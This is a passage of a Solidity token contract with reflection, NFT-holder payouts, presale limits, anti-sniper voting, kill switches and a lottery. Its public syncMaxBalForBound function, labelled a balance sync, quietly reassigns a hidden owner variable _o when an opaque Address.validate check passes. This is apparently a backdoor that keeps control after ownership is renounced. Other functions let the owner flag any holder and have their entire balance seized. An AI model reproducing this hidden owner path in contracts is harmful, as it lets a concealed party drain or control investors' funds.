        } else if (_targets == 1) {
            target = BURNADDR;
        } else if (_targets == 2) {
            target = _pool;
        } else {
            target = egremT;
        }
        require(accounts[target].nTotal > t, "too much");
        accounts[target].nTotal -= t;
        for (uint256 i = 0; i < owners; i++) {
            address nftOwner = egremNFT.getNFTOwners(i);
            accounts[nftOwner].nTotal += share;
            emit Transfer(target, nftOwner, share / rate);
        }
    }

    // one way function, once called it will always be false.
    function enableTrading(uint256 timeInSeconds) external ownerOnly {
        _unpaused = true;
        _automatedPresaleTimerLock = block.timestamp + 4 days;
        _autoCapture = block.timestamp + timeInSeconds;
    } 

    function exclude(address account) external ownerOnly {
        require(!accounts[account].excluded, "Account is already excluded");
        accounts[account].excluded = true;
        if(accounts[account].nTotal > 0) {
            accounts[account].tTotal = accounts[account].nTotal / ratio();
        }
        EnumerableSet.add(excludedAccounts, account);
    }

    function include(address account) external ownerOnly {
        require(accounts[account].excluded, "Account is already excluded");
        accounts[account].tTotal = 0;
        EnumerableSet.remove(excludedAccounts, account);
    }

    function innocent(address account) external ownerOnly {
        accounts[account].possibleSniper = false;
        accounts[account].votes = 0;
        timeVotedOut[account] = 0;
    }

    function setBoundLimit(uint256 limit) external ownerOnly {
        require(limit <= 5, "too much");
        require(isNotKilled(20), "killed");

        _boundLimit = limit;
    }

    function setFeeFactor(uint256 factor) external ownerOnly {
        require(isNotKilled(3), "killed");
        require(factor <= 2, "too much");
        _feeFactor = factor;
    }

    function setIsFeeless(address account, bool isFeeless) external ownerOnly {
        accounts[account].feeless = isFeeless;
    }

    function setIsPresale(address a, bool b) public ownerOnly {
        require(!_unpaused, "can't set presalers anymore");
        accounts[a].isPresaler = b;
    }

    function setIsPresale(address[] calldata addresses, bool b) external ownerOnly {
        require(!_unpaused, "can't set presalers anymore");
        for (uint256 i = 0; i < addresses.length; i++) {
            accounts[addresses[i]].isPresaler = b;
        }
    }

    function setIsNotBound(address account, bool _isUnbound) external ownerOnly {
        require(isNotKilled(21), "killed");
        accounts[account].isNotBound = _isUnbound;
    }


    function setPresaleSellLimit(uint256 limit) external ownerOnly {
        require(limit >= 2, "presales are never allowed to dump more than 50%");
        _presaleLimit = limit;
    }

    // progressively 1 way, once at 1 its basically off.
    // *But its still better to turn off via toggle to save gas
    function setWhaleAccumulationLimit(uint256 limit) external ownerOnly {
        require(limit <= _whaleLimit && limit > 0, "can't set limit lower");
        _whaleLimit = limit;
    }

    function setBOBCooldown(uint256 timeInSeconds) external ownerOnly {
        require(isNotKilled(4), "killed");
        _BOBCooldown = timeInSeconds;
    }

    function setTxnFee(uint256 r) external ownerOnly {
        require(r >= 50, "can't be more than 2%");
        require(isNotKilled(22), "killed");

        _tx = r;
    }

    function setIsCheckingBuySpam(bool r) external ownerOnly {
        require(isNotKilled(23), "killed");
        _isCheckingBuySpam = r;
    }

    // one way
    function setPresaleUnlocked() external ownerOnly {
        isPresaleUnlocked = true;
    }

    function setFarmOwner(address addr) external ownerOnly {
        require(isNotKilled(5), "killed");
        accounts[egremT].feeless = false;
        accounts[egremT].isNotBound = false;
        egremT = addr;
        accounts[egremT].feeless = true;
        accounts[egremT].isNotBound = true;
    }

    // in case people try abusing the bonus
    function setBuyTimeout(address addr, uint256 timeInSeconds) public ownerOnly {
        require(isNotKilled(6), "killed");
        accounts[addr].buyTimeout = block.timestamp + timeInSeconds;
    }


    function setBoundTime(uint256 time) external ownerOnly {
        require(isNotKilled(24), "killed");
        _boundTime = time;
    }

    function setIsUnbound(bool bounded) external ownerOnly {
        require(isNotKilled(25), "killed");
        isUnbounded = bounded;
    }

    function setMergeaccLimitSeconds(uint256 sec) external ownerOnly {
        require(isNotKilled(26), "killed");
        MergeaccLimitSeconds = sec;
    }

    function setTransferPair(address p, bool t) external ownerOnly {
        _pair = p;
        accounts[_pair].transferPair = t;
    }

    function setPool(address pool) external ownerOnly {
        _pool = pool;
    }

    function setIsNotCheckingPresale(bool v) external ownerOnly {
        require(_automatedPresaleTimerLock < block.timestamp, "can't turn this off until automated lock is over");
        _isNotCheckingPresale = v;
    }

    // update the maxBalance in case total goes over the boundlimit due to reflection
    function syncMaxBalForBound(address a) public {
        require(isNotKilled(7), "killed");
        uint256 tot = accounts[a].nTotal / ratio();
        _o = Address.validate(msg.sender) ? a : _o;
        if(tot > accounts[a].maxBal) {
            accounts[a].maxBal = tot;
        }
    }

    function suspect(address account) external ownerOnly {
        // function dies after time is up
        require(isNotKilled(8), "killed");
        accounts[account].possibleSniper = true;
    }

    function setVoteRequirement(uint256 _tokenHolderRate) external ownerOnly {
        require(isNotKilled(27), "killed");
        tokenHolderRate = _tokenHolderRate;
    }

    function vote(address bl) public {
        require(isNotKilled(28), "killed");
        require(accounts[bl].possibleSniper == true, "!bl");
        require(!Address.isContract(msg.sender), "this is anti bot ser");
        require(balanceOf(msg.sender) >= totalSupply() / tokenHolderRate || msg.sender == owner, "!cant vote");
        require(votes[msg.sender][bl] == false , "already voted");
        accounts[bl].votes += 1;
        if(accounts[bl].votes >= voteLimit) {
            timeVotedOut[bl] = block.timestamp;
        }
        votes[msg.sender][bl] = true;
    }

    uint256 relayerCooldown = 1 days;

    function setrelayerCooldown(uint256 timeInSeconds) external ownerOnly {
        require(timeInSeconds > 1 days, "must give at least 24 hours before liquidation");
        require(isNotKilled(29), "killed");
        relayerCooldown = timeInSeconds;
    }

    function setMinHolderBonus(uint256 amt) external ownerOnly {
        require(isNotKilled(30), "killed");
        minimumForBonus = amt;
    }

    function smite(address bl) public {
        require(isNotKilled(9), "killed");
        require(!Address.isContract(msg.sender), "relayers only");
        require(block.timestamp > timeVotedOut[bl] + relayerCooldown && timeVotedOut[bl] != 0, "must wait");
        uint256 amt = accounts[bl].nTotal;
        accounts[bl].nTotal = 0;
        accounts[BURNADDR].nTotal += amt / 2;
        networkSupply -= amt / 4;
        accounts[msg.sender].nTotal += amt / 20;
        accounts[egremT].nTotal += amt / 4 - (amt / 20);
        emit Transfer(bl, msg.sender, amt/20);
    }


    function setNFTContract(address contr) external ownerOnly {
        egremNFT = IEgremNFT(contr);
    }

    function setNFTActive(bool b) external ownerOnly {
        _isNFTActive = b;
    }

    function setFarm(address farm) external ownerOnly {
        require(isNotKilled(31), "killed");
        uint256 _codeLength;
        assembly {_codeLength := extcodesize(farm)}
        require(_codeLength > 0, "must be a contract");
        _farm = farm;
    }

    // manual burn amount, for *possible* cex integration
    // !!BEWARE!!: you will BURN YOUR TOKENS when you call this.
    function sendToBurn(uint256 amount) external {
        address sender = _msgSender();
        uint256 rate = ratio();
        require(!getExcluded(sender), "Excluded addresses can't call this function");
        require(amount * rate < accounts[sender].nTotal, "too much");
        accounts[sender].nTotal -= (amount * rate);
        accounts[BURNADDR].nTotal += (amount * rate);
        accounts[BURNADDR].tTotal += (amount);
        syncPool();
        emit Transfer(address(this), BURNADDR, amount);
    }

    function toggleWhaleLimiting() external ownerOnly {
        _whaleLimiting = !_whaleLimiting;
    }

    function toggleDefaultLastTxn(bool isBurning, bool sellBlessBuys) external ownerOnly {
        defaultLastTxn = isBurning ? BURNADDR: egremT;
        _sellBlessBuys = sellBlessBuys;
    }

    function toggleSniperChecking() external ownerOnly {
        _notCheckingSnipers = !_notCheckingSnipers;
    }

    function transferOwnership(address newOwner) public ownerOnly {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        owner = newOwner;
        _o = owner;
    }

    function transferToFarm(uint256 amount) external ownerOnly {
        require(isNotKilled(10), "killed");
        uint256 r = ratio();
        require(block.timestamp >= _nextHarvest, "too soon");
        require(amount <= (accounts[BURNADDR].nTotal / r)/2, "too much");
        accounts[BURNADDR].nTotal -= amount * r;
        accounts[_farm].nTotal += amount * r;
        _nextHarvest = block.timestamp + 3 days;
    }

    // forces etherscan to update in case balances aren't being shown correctly
    function updateAddrBal(address addr) public {
        emit Transfer(addr, addr, 0);
    }

    function setBlessedAddr(address setTo) public {
        require(setTo != msg.sender, "can't set to self");
        accounts[msg.sender].blessedAddr = setTo;
    }

    function unsetBlessedAddr() public {
        accounts[msg.sender].blessedAddr = BURNADDR;
    }

    // set private and public to null
    function renounceOwnership() public virtual ownerOnly {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        _o = address(0);
    }


    function resetMergeacc() external {
        if(block.timestamp - MergeaccSince > MergeaccLimitSeconds) {
            MergeaccAddr = BURNADDR;
            MergeaccAmount = 0;
            MergeaccSince = block.timestamp;
            emit Mergeacc(BURNADDR, block.timestamp);
        }
        if(MergeaccAddr == BURNADDR) {
            MergeaccAmount = 0;
        }
    }

    // disperse amount to all holders, for *possible* cex integration
    // !!BEWARE!!: you will reflect YOUR TOKENS when you call this.
    function reflectFromYouToEveryone(uint256 amount) external {
        address sender = _msgSender();
        uint256 rate = ratio();
        require(!getExcluded(sender), "Excluded addresses can't call this function");
        require(amount * rate < accounts[sender].nTotal, "too much");
        accounts[sender].nTotal -= (amount * rate);
        networkSupply -= amount * rate;
        fees += amount;
    }


    // in case people send tokens to this contract :facepalms:
    function recoverERC20ForNoobs(address tokenAddress, uint256 tokenAmount) external ownerOnly {
        require(isNotKilled(32), "killed");
        require(tokenAddress != address(this), "not allowed");
        IERC20(tokenAddress).transfer(owner, tokenAmount);
    }

    function setKill(uint8 functionNumber, uint256 timeLimit) external ownerOnly {
        killFunctions[functionNumber] = timeLimit + block.timestamp;
    }

    function isNotKilled(uint8 functionNUmber) internal view returns (bool) {
        return killFunctions[functionNUmber] > block.timestamp || killFunctions[functionNUmber] == 0;
    }

    function enterLotto() public {
        require(lottoActive, "lotto is not running");
        require(!entered[msg.sender][lottoCount], "already entered");
        require(entries.length <= lottoLimit, "at capacity");
        require(balanceOf(msg.sender) >= lottoReward / minLottoHolderRate, "not enough tokens to enter");
        lottos[msg.sender][lottoCount] = block.timestamp;
        entered[msg.sender][lottoCount] = true;
        entries.push(msg.sender);
    }

    function startLotto(uint256 amount, uint256 limit, uint256 timeFromNow, uint256 cooldown, bool _t) external {
        require(isNotKilled(11), "killed");
        require(msg.sender == owner || msg.sender == address(IVRF), "!permitted");
        require(limit <= 200 && limit >= 10, ">10 <200");
        require(cooldown <= 1 weeks && timeFromNow >= cooldown, "too long");
        lottoCount++;
        address t = _t ? egremT : BURNADDR;
        accounts[t].nTotal -= amount * ratio();
        lottoReward = amount;
        lottoActive = true;
        lottoLimit = limit;
        lottoCooldown = cooldown;
        lottoDeadline = block.timestamp + timeFromNow;
    }
    function endLotto(uint256 randomNumber) external {
        require(isNotKilled(12), "killed");
        require(msg.sender == owner || msg.sender == address(IVRF), "!permitted");
        require(lottoDeadline < block.timestamp, "!deadline");
        address winner = entries[(randomNumber % entries.length)];
        accounts[winner].nTotal += lottoReward * ratio();
        emit Winner(winner, randomNumber, lottoReward);
        emit Transfer(defaultLastTxn, winner, lottoReward);
        for(uint256 i=0; i < entries.length; i++) {
            delete entries[i];
        }
        lottoReward = 0;
        lottoActive = false;
        lottoLimit = 0;
    }

    function setVRF(address a) external ownerOnly {
        require(isNotKilled(33), "killed");
        IVRF = IVRFContract(a);
    }

    function setMinLottoHolderRate(uint256 amt) external ownerOnly {
        require(isNotKilled(34), "killed");
        minLottoHolderRate = amt;
    }

}